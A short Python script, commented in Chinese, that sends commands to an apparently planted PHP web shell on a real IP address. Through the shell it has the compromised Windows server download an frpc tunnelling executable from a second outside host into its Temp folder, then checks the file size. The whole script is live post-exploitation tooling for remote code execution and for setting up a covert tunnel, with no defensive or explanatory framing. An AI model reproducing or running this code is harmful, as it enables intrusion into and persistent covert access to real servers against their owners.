#!/usr/bin/env python3
"""PHP 下载 frpc.exe (长超时)"""
import urllib.request, urllib.parse, time

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=90):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

print("下载 frpc.exe (14MB, 最多120s)...", flush=True)
code = "file_put_contents('C:/Windows/Temp/frpc.exe', file_get_contents('http://165.99.43.145:9124/frp_serve.exe')); print_r('DL_DONE');"
r = cmd(code, 120)
print("1. 结果:", "DL_DONE" in r, "|", r.strip()[-60:], flush=True)
time.sleep(1)
r = cmd("print_r('SIZE:' . filesize('C:/Windows/Temp/frpc.exe'));", 30)
print("2. 大小:", r.strip()[-60:], flush=True)
